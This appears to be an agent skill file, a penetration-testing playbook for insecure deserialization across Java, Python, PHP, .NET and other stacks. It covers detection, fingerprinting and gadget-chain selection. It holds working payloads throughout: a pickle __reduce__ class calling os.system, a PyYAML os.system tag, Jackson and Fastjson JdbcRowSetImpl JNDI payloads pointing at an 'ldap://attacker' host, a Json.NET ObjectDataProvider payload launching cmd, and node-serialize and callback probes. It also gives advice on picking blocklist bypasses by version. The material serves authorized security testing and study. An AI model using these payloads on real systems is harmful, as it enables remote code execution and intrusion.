---
name: insecure-deserialization
description: Insecure deserialization across Java (native serialization + Jackson/Fastjson polymorphic typing + Hessian/Kryo), Python (pickle/YAML/jsonpickle + ML-pipeline unsafe-by-default cluster), PHP (unserialize + PHAR), .NET (BinaryFormatter/ViewState + Json.NET TypeNameHandling), Ruby (Marshal + Psych), Node.js (node-serialize + serialize-javascript), Go/Rust (encoding/gob + serde), and JWT/JWS/JWE (algorithm confusion + nested-JWT DoS), covering gadget-chain selection against fingerprinted classpath, format-parser differentials, JEP 290/415 filter architecture, and the Sleeping Giants supply-chain reframing.
---

# Insecure Deserialization

Insecure deserialization passes attacker-controlled byte streams or structured blobs to a language-native unmarshal function, granting a primitive that ranges from arbitrary-object-construction (`new AnyClass(attackerProps)`) through gadget-chain-driven RCE (a class already on the classpath whose magic method reaches `exec`/`eval`/`Method.invoke`/JNDI-lookup with attacker-supplied arguments) through auth bypass via forged session/role objects and privilege escalation via manipulated fields on trusted types. The primitive is decided by three orthogonal facts: the *unmarshaller* (does it accept polymorphic type metadata? does it call constructors, setters, or `readObject`?), the *classpath* (is a chain reachable from the sink to a dangerous sink like `Runtime.exec`?), and the *invocation* (does a magic method fire on unmarshal and can it be steered by attacker property values?). Each is a separate exploitation gate; miss one and the payload is inert.

The class has shifted since 2024. Kreyssig, Houy, Riom, and Bartel (CCS'25, arXiv:2504.20485 §4) show that Java gadget-chain reachability is a *fluctuating* property of a dependency's history — three stealthy modification patterns (Transitive Serializability, Final Properties, Interface Method Reachability) activate previously-dormant chains in 139 of 533 sampled Maven dependencies (26.08%), with 53 confirmed dormant chains introducible through minor upstream code modifications. Any one-shot audit that returns "no chain" only holds for the version audited; the finding is a moving target that has to be re-run per release. Load `insecure_deserialization_novel_deep.md § Sleeping Giants — Dormant Chains and Supply-Chain Reframing` for the three-pattern decomposition and audit implications; this file names the reframe and routes.

## Attack Surface

**Formats**
- **Java**: native serialization (`ObjectInputStream.readObject`), XStream (XML), Jackson / fastjson / fastjson2 with polymorphic typing enabled, YAML via SnakeYAML (pre-2.0 unsafe by default; 2.0 flipped to `SafeConstructor`), Hessian / Burlap binary RPC, Kryo, Java-EE JMS `ObjectMessage`, RMI/JMX registries, JBoss/WildFly/WebLogic T3, remote-EJB stubs.
- **Python**: `pickle.loads` / `cPickle.loads`, `yaml.load` (unsafe branches only — see §Python), `yaml.unsafe_load`, `jsonpickle.decode`, `marshal.loads`, `shelve` (pickle-backed), `dill.loads`, `cloudpickle.loads`, `joblib.load` (pickle underneath), `torch.load` (weights_only default flipped in 2.6 but incompletely — see §Python), Ray / MLflow / Hugging Face model-load pipelines.
- **PHP**: `unserialize()` on any user-influenced blob (POST body, cookie, hidden field, session store), PHAR metadata deserialization via `phar://` stream wrapper (only on PHP < 8.0 for the plain-file-op auto-trigger — see §PHP), Laravel/Symfony/WordPress signed-cookie stores whose HMAC secret leaked.
- **.NET**: `BinaryFormatter`, `LosFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter` (ViewState), `JavaScriptSerializer` with `SimpleTypeResolver`, Json.NET (`Newtonsoft.Json`) with any `TypeNameHandling` value other than `None`, `DataContractJsonSerializer`/`DataContractSerializer` with attacker-influenced known-type lists, YamlDotNet with default deserializer.
- **Ruby**: `Marshal.load` on any untrusted byte string, `YAML.load` (pre-Psych-4) and `YAML.unsafe_load` (Psych 4+), Rails cookie stores when `secret_key_base` leaks, ActiveSupport `MessageEncryptor` with a leaked key.
- **Node.js**: `node-serialize`'s `unserialize()` (the `_$$ND_FUNC$$_` marker), `serialize-javascript` output that reaches `eval`/`new Function` on the client side, `funcster`, `serialize-to-js`, and prototype-pollution-to-deserialization bridges where a merge reaches an unmarshal path.
- **Go / Rust**: `encoding/gob` (stdlib itself says "outside the scope of https://go.dev/security/policy"), `serde` with format crates that admit callback-shape tags (`serde_pickle`, `ciborium` with user-registered tag handlers), `bincode` (unmaintained per docs.rs), any reflection-based protobuf decoder that trusts a "type-URL" field.
- **JWT / JWS / JWE**: nested JWTs (`cty: JWT`) that a library recursively verifies, algorithm-confusion (HS256 signed with a public key when the verifier expected RS256), JWKS-follow-redirect SSRF, options-dictionary mutation.

**Transports and containers**
Java RMI/JMX registries, HTTP body / query / header, cookies, WebSocket binary frames, message queues (JMS, RabbitMQ, Kafka with a Java serializer), gRPC when a request field carries a nested serialized blob, S3/GCS/Blob objects consumed by a background worker, cache entries in Redis / Memcached storing serialized objects, database columns storing `bytea`/`blob`/`text` that the app unmarshals on read.

**Input locations**
Cookies (`JSESSIONID` variants, `.ASPXAUTH`, `laravel_session`, `_yourapp_session`, product-specific tokens), hidden form fields, `state`/`data`/`object` query params, base64 blobs, WebSocket binary frames, uploaded files (SVG/DOCX/PDF with embedded serialized objects), profile fields stored server-side and unmarshaled by a background worker (the second-order surface).

**Sinks that don't look like sinks** — deserialization surfaces that a source-first grep will miss because the unmarshal is buried inside a framework primitive:

- **Job / task queues** — Celery (Python, default pickle serializer historically), Sidekiq / Resque (Ruby, YAML/JSON options), Bull / BullMQ (Node), Kafka Streams with Java serializers, Airflow XCom (pickle), Dagster / Prefect job payloads. A queue that accepts jobs from a web tier is a deserialization sink even without an obvious `pickle.loads` in the code.
- **Session middleware** — Flask-Session, Django `PickleSerializer`, Express `express-session` with `store: new RedisStore()` where the app writes objects into the store, Rails `Marshal`-backed cache stores.
- **Cache adapters** — anything writing serialized objects to Redis / Memcached / DynamoDB / a database `blob` column. The read path deserializes.
- **File-processing pipelines** — SVG/DOCX/XLSX parsers that internalize embedded XML with reference-to-object semantics; PDF renderers that process form fields via serialized data; image-processing chains that carry EXIF payloads through serialized structures.
- **RPC / gRPC handlers** with a field carrying a nested "any" or `Struct` value — the outer protobuf is safe but the nested value dispatches to a language-native deserializer.
- **Log aggregation** — structured-log ingesters (Filebeat → Logstash → Elasticsearch) that reconstruct Java objects from a `Grok`-parsed event, or JSON-log renderers that instantiate typed events.
- **Model registries** — MLflow model registry, HuggingFace hub, sagemaker model artifacts; any "load a model" verb.
- **Import/export tools** — CSV/JSON/YAML import endpoints that reconstruct database rows via typed serializers.
- **Feature-flag stores** — `ConfigCat`, `Unleash`, and homegrown flag services that push serialized policy blobs to clients; the client deserializes.

## Detection & Confirmation

**Magic bytes (post-base64/gzip decode; unwrap before matching)**
- Java native: `AC ED 00 05` (base64 prefix `rO0`).
- Java gzipped: `1F 8B` around a `rO0` when un-gzipped.
- PHP: leading `O:<n>:` (object), `a:<n>:` (array), `s:<n>:` (string).
- .NET `BinaryFormatter`: `00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00 06 01 00 00 00`.
- .NET `LosFormatter` (ViewState): base64 that decodes to `FF 01` header, then a token tree.
- `MessagePack`: single-byte marker (`80-8F` fixmap, `A0-BF` fixstr, etc.).
- CBOR: major-type header byte, tags visible as `0xC0`–`0xDB` prefixes.
- Python `pickle`: `\x80\x04` or `\x80\x05` (protocol 4/5) preamble; opcode ends with `.` (`STOP`).

**Framework fingerprints** — `X-Powered-By: PHP/8.4`, ASP.NET view state generator `__VIEWSTATEGENERATOR`, Spring/Struts error stacks that name `ObjectInputStream`, `Content-Type: application/x-java-serialized-object`, custom `.jsessionid` alternatives, WebLogic `t3://` on 7001, JMX RMI on 1099, JBoss remote EJB.

**Baseline traffic patterns** — before firing any probe, capture 5–10 legitimate requests to the same endpoint and compare their response-time distribution, `Content-Length` distribution, and error-page shape. The baseline is the reference for every subsequent finding: a probe that produces a 500 with a class-name in the trace is only diagnostic if the legitimate baseline does *not* produce the same 500. Similarly, a payload whose response is 3s slower than baseline confirms a timing-based sink only if the baseline's jitter is under a few hundred milliseconds. Skipping the baseline capture leads to false confidence on flaky targets.

**Wire-trace preservation** — from the first probe onward, save every request/response pair to the artifact directory. When the exploit chain is complex, a stored wire trace is what makes the finding reproducible; from-memory reconstruction after the fact is unreliable. Use `mitmproxy --save-stream-file=` or Burp's session-save feature; do not rely on scrollback.

**White-box grep (broad first pass, then narrow)**
```
pickle.loads     unserialize(       ObjectInputStream    BinaryFormatter
yaml.load        readObject(        TypeNameHandling     Marshal.load
jsonpickle       @type              enableDefaultTyping  LosFormatter
_$$ND_FUNC$$_    Phar::getMetadata  jwt.decode(          jwt.verify(
torch.load       joblib.load        cloudpickle          pickle.load
```

**Sink-first grep** narrows faster than source-first for polymorphic-type sinks: search for `enableDefaultTyping` / `activateDefaultTyping` / `@JsonTypeInfo(use = Id.CLASS)` (Java), `TypeNameHandling.Objects|All|Auto` (.NET), `unsafe_load` and bare `yaml.load(x)` without a `Loader=` on PyYAML < 6.0, `Marshal.load(request` (Ruby).

**Report-input checklist for a base-tier finding**. Before writing up any deserialization finding, verify each of the following is captured in the artifact directory: (a) the fingerprint evidence — the exact library and version identified, with the wire-trace excerpt that revealed it; (b) the sink-liveness proof — in-graph error, DNS callback, or timing shift, depending on which the ladder reached; (c) the exact payload used, in the exact wire encoding delivered; (d) the target endpoint URL, HTTP method, and any authentication context required; (e) the rebuttal instance's response to the same payload; (f) the routing pointer to `rce.md` (or the appropriate downstream file) for the post-exec expansion. A finding missing any of these six is not report-ready; walk back to the ladder step that was skipped and complete it before writing up.

**Callback oracles (safe-first — do not fire RCE gadgets before the sink is confirmed)**
- Java: `ysoserial URLDNS` produces a `HashMap`+`URL` graph that resolves the URL on `hashCode()` during deserialization — DNS beacon proves the sink runs even when no gadget class is present. This is the correct first probe.
- PHP: a benign class in a phpggc chain whose `__wakeup` performs `file_get_contents('http://<oast>/')`, or a lightweight `error_log` in the `__destruct` — pick a chain in the framework already known to be on-target.
- .NET: `ysoserial.net -g PSObject -f ObjectStateFormatter -c "nslookup <oast>"` is the ViewState-callback probe on Windows targets.
- Python: `cPickle.loads(pickle.dumps(subprocess.Popen(['nslookup','<oast>'])))` for a callback-only probe.
- Node.js: `_$$ND_FUNC$$_function(){require('dns').lookup('<oast>',()=>{})}()` for `node-serialize`.
- Ruby: a benign `Marshal.dump` payload that reaches a class whose `_load` performs `Net::HTTP.get(URI('<oast>'))` — pick a Rails cookie-store shape so the payload also proves the sink is a cookie-driven deserializer specifically.
- YAML: `!!python/object/apply:socket.gethostbyname ['<oast>.tld']` on any Python target that reaches `yaml.unsafe_load` — the DNS resolution is the beacon, no exec needed. Rebuttal-compatible because a safe-load configuration returns `ConstructorError` instead.
- JWT: submit a JWT with `jku` pointing at an attacker-controlled URL and observe whether the target's JWKS-fetcher reaches out. The out-of-band request from the target's egress IP confirms both the sink liveness and the client-side fetch behavior in one probe.

Confirm the DNS/HTTP hit in `interactsh-client` **before** firing the command-exec gadget — a request that never lands means the sink is not live, and a subsequent RCE payload will only add WAF noise. A blocked callback with no request in the wire trace is not the same as a sink that returned no callback: distinguish "network egress blocked" from "sink dead" using an in-graph error probe (a malformed length prefix that would raise an exception the app logs) before concluding.

**Confirmation-without-RCE ladder.** Between "found a sink" and "proved RCE" there are safer intermediate proofs — use them.

1. **In-graph parse error** — a length prefix or magic-byte tweak that would only be caught by the deserializer itself. If the app logs a class-name exception matching the format, the sink is live even if no callback arrives. This is the "did the parser run?" oracle.
2. **DNS callback** — the URLDNS-shape oracle above. Proves the sink instantiates and runs graph invariants (`hashCode`) but does not require a chain reaching `Runtime.exec`.
3. **HTTP callback** — a chain that performs `URL.openConnection().getInputStream()` or the language equivalent. Proves outbound reachability on top of sink liveness — useful when DNS is filtered but HTTP is not.
4. **Timing side-channel** — a chain that sleeps N seconds (`Thread.sleep`, `time.sleep`, `sleep()`), measurable at the response boundary. Useful when both DNS and HTTP egress are blocked.
5. **File read** — a chain that reads a fixed-path file (`/etc/hostname`, `/etc/passwd`, `C:\Windows\win.ini`) and reflects it into an observable channel (a response field, an error message). Proves file-system access before proving command execution.
6. **Command exec (final)** — a chain that runs `id` / `whoami` / `hostname` and reflects the output. Only fire after 1–5 have all landed cleanly.

The reason for the ladder is auditability: a report that jumps from "grep hit" to "RCE PoC" is not verifiable without re-firing the destructive payload; a report that documents the sink liveness, then reachability, then execution, is reproducible with a safer regression payload.

## Key Vulnerabilities

### Java Deserialization

**Native serialization (`ObjectInputStream.readObject`)**
Primitive: attacker names the classes in the graph; deserializer instantiates them and runs `readObject` on each, plus any invariant-restoration chain the classes wire up. RCE gadgets are combinations of Serializable classes whose `readObject` / `hashCode` / `equals` / `toString` / invocation-handler chain arrives at a `Runtime.exec` / `ProcessBuilder.start` / `Method.invoke` / JNDI-lookup call site, with attacker property values steering the arguments. Detection is `AC ED 00 05` magic; confirmation is the `URLDNS` DNS-callback probe. The classpath — not the sink — decides which chain fires; fingerprint bundled JARs before selecting a payload.

**Gadget-chain selection is a classpath problem, not a payload problem.** ysoserial ships 34 named chains (AspectJWeaver, BeanShell1, C3P0, Click1, Clojure, CommonsBeanutils1, CommonsCollections1–7, FileUpload1, Groovy1, Hibernate1/2, JBossInterceptors1, JRMPClient, JRMPListener, JSON1, JavassistWeld1, Jdk7u21, Jython1, MozillaRhino1/2, Myfaces1/2, ROME, Spring1/2, URLDNS, Vaadin1, Wicket1) and each demands a specific library-version tuple be on the target's classpath. Enumerate the classpath first (JAR names from stack traces, `WEB-INF/lib`, `MANIFEST.MF` disclosure) and match a chain to what is present; do not spray chains that require libraries the target does not have. The novel sibling owns the per-chain library preconditions and the current ICSE'25 trampoline-gadget frontier — load `insecure_deserialization_novel_deep.md § ysoserial Chain Roster and Selection` for the full table.

**High-frequency chain preconditions** — the eight most-often-reachable chains, with the library requirement each imposes:
- **URLDNS** — none (JDK-only). Safe DNS oracle; use first on every Java target.
- **CommonsCollections3** — `commons-collections:3.1` on classpath; wide compatibility across Java 6–8.
- **CommonsCollections5/6** — `commons-collections:3.1`, works past `java.lang.Runtime` runtime blocks.
- **CommonsBeanutils1** — `commons-beanutils:1.9.2` plus `commons-collections` on classpath; useful when CC-only chains fail.
- **Spring1/2** — Spring 4.x on classpath; targets Spring's own reflection helpers.
- **Groovy1** — Groovy runtime present (`groovy-all:2.3.9`); reaches `MethodClosure`.
- **Hibernate1/2** — Hibernate ORM on classpath (`hibernate-core:4.x`); useful in ORM-heavy stacks.
- **ROME** — ROME feed parser (`rome:1.0`) on classpath; often present in RSS-consuming apps.

Miss any of the library preconditions and the chain silently fails — the deserializer runs the graph but the trampoline gadget's target class raises `ClassNotFoundException`, which the app usually swallows. Enumerate before you fire.

**Remote-endpoint enumeration** — Java deserialization sinks are not just HTTP. The classic protocols each expose their own port and probe shape:
- **RMI Registry** on 1099 / 1098 / arbitrary — `rmiregistry` accepts serialized `UnicastRef` handles; `nmap -p1099 --script rmi-dumpregistry` enumerates bound objects. A registered object with a mutable state accepting serialized args is the sink.
- **JMX** on 9010 / 9999 / arbitrary — `jconsole service:jmx:rmi:///jndi/rmi://<host>:<port>/jmxrmi`, then invoke MBeans that accept `Object` args.
- **JBoss/WildFly EJB remoting** on 4447 / 8080-http-upgrade — serialized EJB stubs.
- **WebLogic T3** on 7001 / T3s on 7002 — a custom binary protocol carrying serialized Java objects; historically the highest-yield Java deser surface on enterprise deployments.
- **JMS `ObjectMessage`** — any queue that publishes/consumes `ObjectMessage` on a message broker (ActiveMQ, IBM MQ) accepts serialized payloads on the consumer side.

Post-SSRF (see `ssrf.md`) reaching one of these ports gives a direct deserialization sink without going through the app's HTTP layer, and internal-only endpoints frequently lack the JEP 290 filters the front-end has.

**Jackson polymorphic typing** — the same battle in a different library. When `enableDefaultTyping()` / `activateDefaultTyping` is on, or a field carries `@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY|PROPERTY)`, Jackson accepts a class name in the type slot and instantiates that class:
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o","autoCommit":true}]
```
The `dataSourceName` setter triggers a JNDI lookup on construction. This is a **denylist-bypass technique class**, not a single CVE: Jackson ships a `SubTypeValidator` (or `PolymorphicTypeValidator`, PTV) blocklist of known-dangerous classes, and each new gadget class discovered on some classpath (`c3p0`, `JdbcRowSetImpl`, `templates.TemplatesImpl`, `ELProcessor`, various script-engine classes) is a fresh bypass until added. Fingerprint the Jackson version and select a gadget the deployed classpath exposes that its PTV of *that* version does not yet cover. **CVE-2026-54512** is the current headline shape — PTV allow-list bypass via nested generic type parameters (`java.util.ArrayList<com.evil.Gadget>` where only `ArrayList` is allow-listed); the container class name is validated, the type-argument class is not. Load `insecure_deserialization_novel_deep.md § jackson-databind CVE-2026-54512 — Generic-Type PTV Bypass` for the affected/fixed table, the `DatabindContext._resolveAndValidateGeneric` mechanism, and the payload construction.

**Fastjson / fastjson2 (`@type` autotype)** — same shape, different key:
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/o","autoCommit":true}
```
Fastjson's autotype has a long lineage of denylist additions and bypasses — double-encoding the class name, `L...;` descriptor wrapping, cache-poisoning the type cache, whitelisted-prefix abuse. Treat it as version-specific: identify the exact fastjson/fastjson2 version (error strings, jar names in stack traces), then select a gadget + bypass documented for that build. Load `dependency_cve_scanning` for the version→advisory mapping; there are many CVEs across this lineage, so pin a number only after confirming against the deployed version.

**JNDI pivots from object construction.** JNDI injection is not itself a serialization format — it becomes part of this workflow when an attacker-selected type, setter, or gadget performs `Context.lookup()` during object construction or property population. `JdbcRowSetImpl` and historical polymorphic JSON chains are examples; Log4Shell reaches JNDI through a different input path (message-format lookups) and is not classified as deserialization here.
- Trace fields such as `dataSourceName`, `jndiName`, `namingURL`, `providerURL` into the exact lookup API and provider.
- Record accepted schemes / provider factories (`ldap`, `ldaps`, `rmi`, DNS URL context, application-specific naming providers). A `dns://` value is not a universal oracle; it works only when the relevant DNS provider is present.
- Separate network lookup, remote object/reference processing, serialized LDAP attributes, remote codebase loading, and local object-factory invocation. Each is a different capability with different runtime controls.
- JEP 290 filters incoming Java serialization graphs but does not disable JNDI remote codebase loading. JNDI providers gained separate remote-class-loading and serialized-data controls across JDK updates; current JDKs disable remote code downloading by default. Record the exact JDK build and provider properties rather than a single "modern Java" rule.
- When remote class loading is off, test whether the returned reference reaches a compatible **local** `ObjectFactory`, bean-property path, expression engine, script engine, or other class already present.

**Hessian / Burlap** — binary RPC formats deserialized by `HessianInput` / `Hessian2Input`. Attacker object graphs reach gadgets even though the wire format is not native Java serialization. Treat serializer version, allowed type metadata, constructors/setters invoked, collection/comparator behavior, and classpath as independent prerequisites; marshalsec (Bechler) documents the format-agnostic thesis and covers 13 non-native marshallers where "no matter how this process is performed and what implicit constraints are in place it is prone to similar exploitation techniques." Pair `semantic_confusion` when a proxy or route policy is expected to make the RPC endpoint unreachable.

**XStream** — XML-shape; historically many RCE chains (CVE-2021-39139/29505/4321x cluster) via unsafe-mode dynamic proxies. Post-1.4.18 allow-list default closed the trivial RCE surface but format-parsing DoS still lands: **CVE-2024-47072** — `BinaryStreamDriver` recursive mapping-token processing DoS (stack-overflow, not RCE). Load `insecure_deserialization_novel_deep.md § XStream CVE-2024-47072` for the mechanism and the note that the briefing-common mislabel of this as RCE is wrong — it is DoS. On legacy pre-1.4.18 deployments the classical RCE chains remain the primary hit.

**SnakeYAML** — pre-2.0 default `Constructor` accepted arbitrary tags such as `!!javax.script.ScriptEngineManager [!!java.net.URL [...]]` → RCE via the `URL`+`ScriptEngineManager` chain (CVE-2022-1471). SnakeYAML 2.0 (released 2023-02-26) flipped `new Yaml()`'s default to `SafeConstructor`, so on 2.x the RCE requires the caller to explicitly opt into `new Yaml(new Constructor(...))`. Fingerprint the version before treating any `yaml.load` sink as unsafe.

### Python

Pickle executes arbitrary code during unpickling *by design* — the language docs themselves say "Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with." Any `pickle.loads(untrusted)` is a finding without further justification:
```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
# base64 encode pickle.dumps(Exploit()) and send as cookie/param
```
Protocol defaults: 3 default in Python 3.0–3.7, 4 default in 3.8–3.13, 5 default starting Python 3.14. `marshal.loads` executes code objects — upstream: "The `marshal` module is not intended to be secure against erroneous or maliciously constructed data. Never unmarshal data received from an untrusted or unauthenticated source." `shelve` is pickle-backed. `dill` and `cloudpickle` extend pickle to closures and lambdas; both are strictly more powerful than pickle for the attacker.

**PyYAML** — the payload:
```yaml
!!python/object/apply:os.system ['id']
```
The vulnerable call is **version-dependent** (measured on PyYAML 6.0.3):
- **PyYAML ≥ 6.0**: `yaml.load(x)` with **no `Loader=` raises `TypeError`** — it will not run at all. RCE needs `yaml.unsafe_load(x)` or `yaml.load(x, Loader=yaml.UnsafeLoader)`. `yaml.safe_load` raises `ConstructorError` on the `!!python/...` tag.
- **PyYAML 5.1–5.x**: bare `yaml.load(x)` warns and defaults to `FullLoader` (blocks `apply`/`new` arbitrary calls, though `FullLoader` had its own historical bypasses).
- **PyYAML < 5.1**: bare `yaml.load(x)` used the full unsafe loader → direct RCE.

Fingerprint the version and the *exact call*: on modern PyYAML the finding is `unsafe_load` / `Loader=Unsafe`, not a bare `yaml.load`. The upstream wiki itself equates power: "`yaml.load` is as powerful as `pickle.load` and so may call any Python function." **`jsonpickle`** — `jsonpickle.decode()` on untrusted JSON is RCE by design: a `{"py/object": ...}`, `{"py/reduce": ...}`, or `{"py/type": ...}` directive reconstructs arbitrary objects/callables.

**ML-pipeline unsafe-by-default cluster (2024–2026 frontier)** — the emerging class in Python is *data-pipeline* libraries that pickle-load by default under the "load a model" verb. **PyTorch** flipped `torch.load()`'s `weights_only` default from `False` to `True` in 2.6 (via PR #137602), which prevents most trivial `pickle.loads` RCE — but `weights_only=True` is *not* a complete mitigation. Two 2025–2026 CVEs land on the `weights_only=True` path: a Critical (April 2025) and a High (January 2026), both remote-code-execution via loader-internal reflection on the "safe" path. **MLflow**'s `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=False` gate is bypassable via the `mlflow.statsmodels` flavor (2026-07). **Ray**'s `ray.data.read_webdataset` default decoder uses `pickle.loads` and `torch.load(weights_only=False)`; a further Ray CVE (2026-04) lands via Parquet Arrow extension-type deserialization. **`joblib.load`** remains raw pickle with no upstream safety flip. Load `insecure_deserialization_novel_deep.md § ML-Pipeline Deserialization — PyTorch weights_only, MLflow, Ray, joblib` for the per-library affected/fixed table, the exact CVE numbers, and the mechanism decomposition. The class abstraction: any library whose "load a model / dataset / artifact" verb touches pickle is presumed unsafe until proven otherwise, and version-gate mitigations advertised as complete typically are not.

**Delivery shapes for Python deserialization** — the payload does not need to arrive as a raw pickle byte string. Common wrappers:
- **HuggingFace / `.pt` / `.pth` files** — `torch.load` on downloaded model weights is a pickle load unless `weights_only=True` and the file is a plain tensor. A malicious model uploaded to a public hub, or a supply-chain compromise of a legitimate model, is the class shape; Hugging Face's own security tooling exists precisely because this is the surface.
- **`joblib` `.pkl` model files** — scikit-learn's canonical distribution format. Any web service that loads a user-supplied `.pkl` for inference is RCE.
- **Tar / zip archives containing pickled entries** — the model-loading verb of many ML frameworks unpacks archives and loads named pickled entries; the outer format is inert but the inner pickle fires.
- **YAML with `!!python/` tags via config files** — CI/CD Ansible playbooks, config parsers.
- **Session stores** — Flask-Session, Django with `PickleSerializer`, older Django SessionStore backends store session data as pickled objects on Redis/Memcached. A cache-write primitive (see `cache_poisoning`) lands session-load RCE.
- **Celery task-queue payloads** — Celery historically used pickle as the default task serializer; a worker consuming attacker-controlled task args is a direct sink.
- **RPC-over-Redis / RQ / Dask** — cluster job frameworks that pickle callables sent to worker nodes; attacker submitting a job via any exposed API is RCE on every worker.

**`dill` / `cloudpickle`** — strictly more powerful than pickle for the attacker: both handle closures, lambdas, and dynamically-defined classes. A `dill.loads(untrusted)` is a superset of `pickle.loads(untrusted)`; treat any grep hit identically. Common in Dask, Ray, and any framework that has to serialize a Python function for cluster execution.

### PHP

**Object injection via `unserialize()`** — magic methods `__wakeup`, `__destruct`, `__toString`, `__call`, `__set`, `__get` fire on classes reconstructed from user-supplied serialized data. POP (Property-Oriented Programming) chains combine these across framework classes to reach `eval`/`exec`/file-write sinks. `phpggc` (ambionics/phpggc) ships gadget chains across **44** frameworks — Bitrix, CakePHP, CodeIgniter4, Doctrine, Dompdf, Drupal, Grav, Guzzle, Horde, Joomla, Kohana, Laminas, Laravel, Magento, Magento2, MediaWiki, Monolog, OpenCart, PHPCSFixer, PHPExcel, PHPSecLib, PHPWord, Phalcon, Phing, Plates, Podio, Pydio, Silverstripe, Slim, Smarty, Snappy, Spiral, Sulu, SwiftMailer, Symfony, TCPDF, ThinkPHP, Typo3, WordPress, Yii, Yii2, Zend, phpThumb, vBulletin — so any modern PHP application reaching an `unserialize` sink is presumed RCE-capable via at least one autoloaded framework class. `allowed_classes` (PHP 7.0+ `unserialize(<blob>, ['allowed_classes' => ...])`) is a mitigation, not a safety guarantee — PHP itself says "Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes."

**Framework-specific POP-chain shapes** — the top four to know at base depth, since a target on any modern PHP stack is likely one of these:

- **Laravel** — chains route through `Illuminate\Broadcasting\PendingBroadcast` → `Illuminate\Bus\Dispatcher` → arbitrary method invocation on any framework class. `phpggc Laravel/RCE1` through `RCE9` cover different Laravel version windows; the current standard is `Laravel/RCE9`. Grep the target for `Illuminate\` classes in error stacks to fingerprint the version.
- **Symfony** — chains via `Symfony\Component\Cache\Adapter\*` → destructor invokes serialized closures via `Symfony\Component\Cache\Adapter\FilesystemAdapter`, or the older `Symfony\Component\HttpKernel\HttpCache\Store`. `phpggc Symfony/RCE1..N` covers the version windows. Combined with the recent Symfony CVE-2026-46636 Twig sandbox bypass, a chain that lands in a template-rendering path is a route to RCE via SSTI.
- **WordPress** — the canonical chain uses `Requests_Cookie` → `Requests_Utility_FilteredIterator` → arbitrary callback via a filter callable. Plugins wildly expand the classpath (WPScan tracks ~100k plugins, each a potential chain surface); the WP-VulDB CVE feed lists dozens of plugin `unserialize` sinks per year.
- **Magento / Adobe Commerce** — CVE-2022-24086 established the class (a payload in the checkout / customer-address serialized field reaches a Symfony DI container path); phpggc's `Magento2` chains reproduce it against unpatched deployments. The 2024 "CosmicSting" (CVE-2024-34102) XXE→PHP-object-injection lineage is the most recent public shape but note the primary XXE is upstream; this file owns only the object-injection sink after XXE lands.

**PHAR stream deserialization.** Any PHP function that takes a filesystem path and stats or reads it — `file_exists`, `file_get_contents`, `filesize`, `fopen`, `file`, `is_file`, `is_dir`, `stat`, `md5_file`, `getimagesize` — parses PHAR metadata when the path starts with `phar://`, and metadata parsing calls `unserialize()`. This turns file-path operations into deserialization sinks. Sink surface: file-preview, download, "does this file exist" validators, image/thumbnail pipelines. Gadget requirement: identical to any `unserialize` sink — an autoloaded class with a steerable magic method. Payload: build a phar with `Phar` / `PharData`, `setMetadata(<serialized gadget>)`, then deliver it; **extension is irrelevant** — PHAR detection reads the internal stub signature, not the name, so a phar renamed `.jpg`/`.png`/`.pdf` still triggers.

**Version fingerprint (verified).** As of **PHP 8.0** the `phar://` wrapper **no longer auto-unserializes** metadata on plain file operations. Measured on PHP 8.4, `file_exists('phar://…')` does not fire a gadget's `__wakeup`, while an explicit `Phar::getMetadata()` still does (and `getMetadata([])` disables class loading). So on 8.0+ the sink needs an explicit `getMetadata()` call in the app; the file-operation auto-trigger only lands on PHP 7.x. Fingerprint the version (`X-Powered-By`, error output) before assuming the plain-file-op sink is live. Load `insecure_deserialization_novel_deep.md § PHP PHAR RFC and Version Boundaries` for the RFC (`phar_stop_autoloading_metadata`, PHP 8.0, 25/0 vote) and the ongoing PHP 8.x PHAR advisories (`phar_tar_number()` integer overflow → tar-entry injection is still landing in 2026).

### .NET Deserialization

**Dangerous formatters** — `BinaryFormatter`, `LosFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter`, and `JavaScriptSerializer` *with a `SimpleTypeResolver`* all deserialize attacker-named types → RCE via `ysoserial.net` gadget chains (`TypeConfuseDelegate`, `WindowsIdentity`, `ObjectDataProvider`, `PSObject`). **`ObjectDataProvider` is the near-universal .NET chain** — ysoserial.net reports it reaching 11 sinks (BinaryFormatter, DataContractSerializer, FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, SharpSerializerBinary/Xml, Xaml, XmlSerializer, YamlDotNet). BinaryFormatter is obsolete in .NET Framework and **removed in-box in .NET 9** — the implementation throws unconditionally starting .NET 9 Preview 6 — but ubiquitous on .NET Framework, which remains in production for years. Load `insecure_deserialization_novel_deep.md § .NET 9 BinaryFormatter Removal — Timeline and Escape Hatches` for the exact version boundary, Microsoft's "unfixable" classification, and the out-of-band `System.Runtime.Serialization.Formatters` NuGet package that restores legacy behavior.

**Json.NET (Newtonsoft)** — exploitable when `TypeNameHandling` is `Objects`, `Arrays`, `All`, or `Auto` (anything but `None`):
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System",
 "StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}}
```
`$type` names the class to build; `ObjectDataProvider` invokes an arbitrary method with arbitrary arguments. The values enumerate an ascending exposure ladder:
- **`None`** — no polymorphic typing accepted; safe.
- **`Objects`** — object types accepted; the sink is live.
- **`Arrays`** — array element types accepted; the sink is live.
- **`Auto`** — polymorphic when the declared property type differs from the runtime type; the sink is live and often invisible in code review because the developer did not opt into it explicitly.
- **`All`** — polymorphic for both objects and arrays; the sink is live and maximal.

Any value other than `None` on a JSON body reachable by attackers is an immediate finding shape. The `SerializationBinder` property can restrict which types are constructed (a manual allow-list), but a permissive binder or a missing binder collapses back to full `TypeNameHandling`.

